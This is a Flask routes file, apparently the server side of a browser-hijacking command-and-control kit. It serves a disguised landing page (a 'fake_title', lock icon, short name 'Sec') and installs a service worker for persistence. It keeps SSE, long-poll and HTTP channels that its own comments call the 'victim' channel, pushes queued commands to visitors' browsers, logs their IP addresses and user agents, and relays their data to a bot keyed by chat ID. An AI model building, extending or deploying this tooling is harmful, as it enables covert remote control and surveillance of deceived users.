# lsh/routes.py
# ============================================================
# Flask Routes — WebSocket + SSE + Long Poll + HTTP
# ============================================================

import os
import json
import time
import uuid
import queue
import threading
from flask import request, jsonify, Response, stream_with_context

from .config import (
    redis_client, RAILWAY_URL, LSH_CONFIG,
    ws_connections, ws_lock, sse_connections, sse_lock,
)
from .session_mgr import (
    create_session, get_session, update_session,
    delete_session, session_exists, update_presence,
    refresh_session_ttl,
)
from .commands import (
    pop_commands, mark_session_active, push_command,
    ack_command, nack_command, get_pending_count,
    get_dead_letters, retry_dead_letters,
)
from .handlers import _handle_incoming
from .templates import LSH_PAGE, SW_FALLBACK


def init_lsh_routes(app, bot):
    """★ تسجيل كل الـ Routes"""

    # ═══════════════════════════════════════════════════════
    # Service Worker
    # ═══════════════════════════════════════════════════════
    @app.route('/sw.js', methods=['GET'])
    def serve_sw():
        try:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            sw_path = os.path.join(base_dir, 'sw.js')
            if os.path.exists(sw_path):
                with open(sw_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            else:
                content = SW_FALLBACK
            return Response(
                content,
                mimetype='application/javascript',
                headers={
                    'Service-Worker-Allowed': '/',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                }
            )
        except Exception as e:
            print(f"[-] serve_sw error: {e}")
            return Response(SW_FALLBACK, mimetype='application/javascript')

    # ═══════════════════════════════════════════════════════
    # Manifest
    # ═══════════════════════════════════════════════════════
    @app.route('/manifest.json', methods=['GET'])
    def serve_manifest():
        manifest = {
            "name": LSH_CONFIG["fake_title"],
            "short_name": "Sec",
            "start_url": "/",
            "display": "standalone",
            "background_color": "#f5f7fa",
            "theme_color": "#2563eb",
            "orientation": "portrait",
            "icons": [{
                "src": "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🔒%3C/text%3E%3C/svg%3E",
                "sizes": "192x192",
                "type": "image/svg+xml",
                "purpose": "any maskable"
            }],
            "scope": "/",
        }
        return Response(
            json.dumps(manifest),
            mimetype='application/manifest+json'
        )

    # ═══════════════════════════════════════════════════════
    # الصفحة الرئيسية
    # ═══════════════════════════════════════════════════════
    @app.route('/lsh', methods=['GET'])
    def lsh_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')

        if not session_id or not chat_id:
            return "Invalid link", 400

        try:
            # ★ إنشاء أو استرجاع جلسة
            if session_exists(session_id):
                create_session(session_id, chat_id)
            else:
                if redis_client:
                    stored = redis_client.get(f"lsh_session:{session_id}")
                    if stored:
                        create_session(session_id, stored)
                    else:
                        create_session(session_id, chat_id)
                else:
                    create_session(session_id, chat_id)
        except Exception as e:
            print(f"[-] session error: {e}")
            create_session(session_id, chat_id)

        html = (LSH_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__CHAT_ID__", str(chat_id))
                .replace("__HTTP_URL__", RAILWAY_URL)
                .replace("__WS_URL__", RAILWAY_URL.replace("https://", "wss://").replace("http://", "ws://"))
                .replace("__SW_VERSION__", LSH_CONFIG["sw_version"]))

        return Response(html, mimetype='text/html')

    # ═══════════════════════════════════════════════════════
    # ★★★ SSE Stream (Server-Sent Events)
    # ═══════════════════════════════════════════════════════
    @app.route('/lsh_sse', methods=['GET'])
    def lsh_sse():
        """قناة SSE للضحية"""
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')

        if not session_id or not chat_id:
            return "Invalid", 400

        # ★ إنشاء قائمة انتظار للجلسة
        sse_queue = queue.Queue(maxsize=100)
        with sse_lock:
            sse_connections[session_id] = sse_queue

        # ★ تحديث Presence
        update_presence(session_id, "sse")

        def generate():
            try:
                # ★ Heartbeat أولي
                yield f"data: {json.dumps({'type': 'connected', 'session_id': session_id})}\n\n"

                last_heartbeat = time.time()

                while True:
                    try:
                        # ★ انتظار أمر لمدة 25 ثانية
                        cmd = sse_queue.get(timeout=25)

                        # ★ إرسال الأمر
                        yield f"data: {json.dumps({'type': 'command', 'cmd': cmd})}\n\n"
                        print(f"[+] SSE send >> {session_id[:8]} | {cmd.get('action')}")

                    except queue.Empty:
                        # ★ Heartbeat كل 25 ثانية
                        now = time.time()
                        if now - last_heartbeat > 20:
                            yield f": heartbeat\n\n"
                            yield f"data: {json.dumps({'type': 'heartbeat', 'ts': now})}\n\n"
                            last_heartbeat = now

            except GeneratorExit:
                print(f"[-] SSE closed: {session_id[:8]}")
            except Exception as e:
                print(f"[-] SSE error: {e}")
            finally:
                with sse_lock:
                    sse_connections.pop(session_id, None)
                update_session(session_id, sse_connected=False)

        return Response(
            stream_with_context(generate()),
            mimetype='text/event-stream',
            headers={
                'Cache-Control': 'no-cache',
                'X-Accel-Buffering': 'no',
                'Connection': 'keep-alive',
            }
        )

    # ═══════════════════════════════════════════════════════
    # ★★★ Long Poll
    # ═══════════════════════════════════════════════════════
    @app.route('/lsh_longpoll', methods=['GET'])
    def lsh_longpoll():
        """Long-polling للأوامر"""
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        timeout = int(request.args.get('t', '25'))

        if not session_id or not chat_id:
            return jsonify({"commands": []}), 200

        # ★ تحديث presence
        update_presence(session_id, "long_poll")

        # ★ حلقة انتظار
        start = time.time()
        commands = []

        while time.time() - start < timeout:
            commands = pop_commands(session_id, max_count=10)
            if commands:
                break
            time.sleep(0.5)

        # ★ تحديث Active
        mark_session_active(session_id)
        refresh_session_ttl(session_id)

        return jsonify({
            "commands": commands,
            "ok": True,
            "ts": time.time(),
        }), 200

    # ═══════════════════════════════════════════════════════
    # ★★★ Main Message Route (موحّد)
    # ═══════════════════════════════════════════════════════
    @app.route('/lsh_msg', methods=['POST'])
    def lsh_msg():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')

            if not session_id or not chat_id:
                return jsonify({"commands": [], "ok": False}), 200

            # ★ جلسة
            sess = get_session(session_id)
            if sess:
                sess["last_seen"] = time.time()
                sess["last_activity"] = time.time()
            else:
                create_session(session_id, chat_id)

            # ★ تحديث Presence
            update_presence(session_id, "http")

            # ★ السحب من Redis
            commands = pop_commands(session_id, max_count=10)
            mark_session_active(session_id)
            refresh_session_ttl(session_id)

            # ★ Ping Response
            dtype = data.get('type')
            if dtype == 'ping':
                return jsonify({
                    "commands": [],
                    "ok": True,
                    "pong": time.time(),
                    "server_time": time.time(),
                }), 200

            # ★ معالجة الرسائل (غير ping)
            skip_types = ('ping', 'sw_ping', 'page_ping', 'auto_ping', 'health_check')

            if dtype and dtype not in skip_types:
                source_ip = (
                    request.headers.get('CF-Connecting-IP') or
                    request.headers.get('X-Forwarded-For') or
                    request.remote_addr or
                    "Unknown"
                )
                if ',' in source_ip:
                    source_ip = source_ip.split(',')[0].strip()

                # ★ تحديث IP / UA
                update_session(
                    session_id,
                    ip=source_ip,
                    user_agent=request.headers.get('User-Agent', '')[:200],
                )

                try:
                    _handle_incoming(bot, chat_id, session_id, data, source_ip)
                except Exception as he:
                    print(f"[-] handle error: {he}")
                    import traceback
                    traceback.print_exc()

            return jsonify({
                "commands": commands,
                "ok": True,
                "server_time": time.time(),
            }), 200

        except Exception as e:
            print(f"[-] lsh_msg FATAL: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"commands": [], "ok": False}), 200

    # ═══════════════════════════════════════════════════════
    # Create Session
    # ═══════════════════════════════════════════════════════
    @app.route('/lsh_create', methods=['POST'])
    def lsh_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        session_id = data.get('session_id') or str(uuid.uuid4()).replace('-', '')[:24]
        create_session(session_id, chat_id)
        return jsonify({"session_id": session_id}), 200

    # ═══════════════════════════════════════════════════════
    # ★ Health Check
    # ═══════════════════════════════════════════════════════
    @app.route('/lsh_health', methods=['GET'])
    def lsh_health():
        session_id = request.args.get('s', '')
        sess = get_session(session_id) if session_id else None

        return jsonify({
            "status": "ok",
            "server_time": time.time(),
            "redis": bool(redis_client),
            "streams": bool(streams_available) if 'streams_available' in dir() else False,
            "session": {
                "exists": sess is not None,
                "last_seen": sess.get("last_seen") if sess else None,
                "channel": sess.get("channel") if sess else None,
                "presence": sess.get("presence") if sess else None,
                "pending_commands": get_pending_count(session_id) if session_id else 0,
            } if sess else None
        }), 200

    # ═══════════════════════════════════════════════════════
    # ★ Ack Command
    # ═══════════════════════════════════════════════════════
    @app.route('/lsh_ack', methods=['POST'])
    def lsh_ack():
        data = request.get_json(silent=True) or {}
        session_id = data.get('session_id')
        cmd_id = data.get('cmd_id')
        status = data.get('status', 'ok')
        reason = data.get('reason', '')

        if not session_id or not cmd_id:
            return jsonify({"ok": False}), 200

        if status == 'ok':
            ack_command(session_id, cmd_id)
        else:
            nack_command(session_id, cmd_id, reason)

        return jsonify({"ok": True}), 200

    # ═══════════════════════════════════════════════════════
    # ★ Dead Letters
    # ═══════════════════════════════════════════════════════
    @app.route('/lsh_dl', methods=['GET'])
    def lsh_dl():
        session_id = request.args.get('s', '')
        if not session_id:
            return jsonify({"items": []}), 200
        return jsonify({
            "items": get_dead_letters(session_id),
        }), 200
